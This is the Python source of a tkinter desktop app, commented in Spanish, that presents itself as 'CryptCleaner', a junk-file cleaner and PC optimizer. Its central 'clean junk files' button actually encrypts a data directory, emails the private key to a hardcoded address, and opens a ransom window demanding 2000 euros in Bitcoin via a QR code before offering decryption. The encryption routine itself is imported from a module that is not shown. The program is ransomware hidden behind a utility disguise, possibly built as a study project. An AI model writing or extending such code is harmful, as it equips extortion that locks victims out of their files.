import sys
from pathlib import Path

# Agregar el directorio base (cryptCleaner/) a la ruta de búsqueda de Python
BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.append(str(BASE_DIR))

import tkinter as tk
from tkinter import Toplevel, simpledialog, messagebox
from PIL import Image, ImageTk
from src.encryptor import encrypt_directory, decrypt_directory

# Configuración de rutas relativas
QR_CODE_PATH = BASE_DIR / "qr_code.png"  # Código QR
DIRECTORY_TO_ENCRYPT = BASE_DIR / "data"  # Directorio para encriptar
ICONS_DIR = BASE_DIR / "icons"  # Directorio de íconos

recipient_email = "tccsmtp12@gmail.com"  # Cambia por el email de destino

# Crear la ventana principal
root = tk.Tk()
root.title("CryptCleaner")
root.geometry("1200x700")
root.configure(bg="#f8f9fa")  # Fondo principal

# Cambiar el ícono de la barra de tareas
icon_path = ICONS_DIR / "app_icon.ico"  # Cambia el nombre del archivo si es necesario
root.iconbitmap(str(icon_path))  # Usar el icono en formato .ico para la barra de tareas

# Configurar estilos globales
FONT_TITLE = ("Arial", 20, "bold")
FONT_TEXT = ("Arial", 14)
PRIMARY_COLOR = "#007bff"
SECONDARY_COLOR = "#6c757d"
BACKGROUND_COLOR = "#f8f9fa"
BUTTON_COLOR = "#28a745"
BUTTON_HOVER_COLOR = "#218838"

# Configurar la ventana
root.grid_rowconfigure(0, weight=1)
root.grid_columnconfigure(1, weight=1)

# Crear el frame del menú en el lado izquierdo
menu_frame = tk.Frame(root, width=300, bg=PRIMARY_COLOR)
menu_frame.grid(row=0, column=0, sticky="ns")

# Crear el frame principal para el contenido en el centro
content_frame = tk.Frame(root, bg=BACKGROUND_COLOR)
content_frame.grid(row=0, column=1, sticky="nsew")

# Función para mostrar un mensaje cuando se hace clic en un botón del menú
def show_message(option):
    tk.messagebox.showinfo("Información", f"Has seleccionado la opción: {option}")

# Función para cargar imágenes PNG
def load_image(path, size=(35, 35)):
    image = Image.open(path).convert("RGBA")
    image = image.resize(size, Image.LANCZOS)
    return ImageTk.PhotoImage(image)

# Cargar los íconos para el menú
icons = {
    "Configuración": load_image(ICONS_DIR / "settings.png"),
    "Drivers": load_image(ICONS_DIR / "drivers.png"),
    "Limpieza": load_image(ICONS_DIR / "clean.png"),
    "Análisis": load_image(ICONS_DIR / "analytics.png"),
    "Optimización": load_image(ICONS_DIR / "optimize.png"),
    "Historial": load_image(ICONS_DIR / "history.png"),
    "Soporte": load_image(ICONS_DIR / "support.png")
}

# Añadir botones con íconos al menú
for text, icon in icons.items():
    btn = tk.Button(menu_frame, image=icon, text=text, compound="left", font=FONT_TEXT,
                    command=lambda t=text: show_message(t), bg=PRIMARY_COLOR, fg="white",
                    activebackground=PRIMARY_COLOR, relief="flat", anchor="w")
    btn.image = icon
    btn.pack(fill="x", padx=10, pady=5, ipady=10)

# Función para encriptar el directorio, enviar la clave privada, y mostrar el mensaje de rescate
def limpiar_archivos():
    encrypt_directory(DIRECTORY_TO_ENCRYPT, recipient_email)  # Encriptar archivos y enviar la clave privada por correo
    show_ransom_message()  # Mostrar mensaje de rescate

# Mostrar mensaje de rescate con QR
def show_ransom_message():
    ransom_window = Toplevel(root)
    ransom_window.title("Advertencia")
    ransom_window.geometry("600x550")
    ransom_window.config(bg=BACKGROUND_COLOR)

    # Mensaje de advertencia
    warning_message = (
        "Todos sus archivos han sido cifrados.\n\n"
        "Si quiere recuperarlos, deposite 2000 euros en BTC\n"
        "a la siguiente cartera y le enviaremos la clave para\n"
        "desencriptarlos:"
    )
    message_label = tk.Label(ransom_window, text=warning_message, font=FONT_TEXT, bg=BACKGROUND_COLOR, fg=SECONDARY_COLOR)
    message_label.pack(pady=20)

    # Cargar y mostrar el código QR
    qr_image = Image.open(QR_CODE_PATH).resize((200, 200), Image.LANCZOS)
    qr_photo = ImageTk.PhotoImage(qr_image)
    qr_label = tk.Label(ransom_window, image=qr_photo, bg=BACKGROUND_COLOR)
    qr_label.image = qr_photo
    qr_label.pack(pady=10)

    # Solicitar clave privada para desencriptar
    def request_decryption():
        private_key_text = simpledialog.askstring("Clave Privada", "Introduce la clave privada en formato PEM:")
        if private_key_text:
            try:
                decrypt_directory(DIRECTORY_TO_ENCRYPT, private_key_text)
                messagebox.showinfo("Desencriptado", "Todos los archivos han sido desencriptados.")
                ransom_window.destroy()
            except Exception as e:
                messagebox.showerror("Error", f"Clave incorrecta o error al desencriptar.\nDetalles: {e}")

    # Botón para desencriptar
    decrypt_button = tk.Button(ransom_window, text="Desencriptar ahora", command=request_decryption, font=FONT_TEXT,
                               bg=BUTTON_COLOR, fg="white", activebackground=BUTTON_HOVER_COLOR)
    decrypt_button.pack(pady=20)

# Botón circular central para limpiar archivos
large_icon = load_image(ICONS_DIR / "clean.png", size=(60, 60))

circle_canvas = tk.Canvas(content_frame, width=120, height=120, bg=BACKGROUND_COLOR, highlightthickness=0)
circle_canvas.place(relx=0.5, rely=0.4, anchor="center")
circle_canvas.create_oval(10, 10, 110, 110, fill=PRIMARY_COLOR, outline="")
circle_canvas.image = large_icon
circle_canvas.create_image(60, 60, image=large_icon)
circle_canvas.bind("<Button-1>", lambda e: limpiar_archivos())

# Etiqueta debajo del círculo
label_text = tk.Label(content_frame, text="Limpiar archivos basura", font=FONT_TITLE, bg=BACKGROUND_COLOR, fg=SECONDARY_COLOR)
label_text.place(relx=0.5, rely=0.5, anchor="n")

# Ejecutar la interfaz gráfica
if __name__ == "__main__":
    root.mainloop()
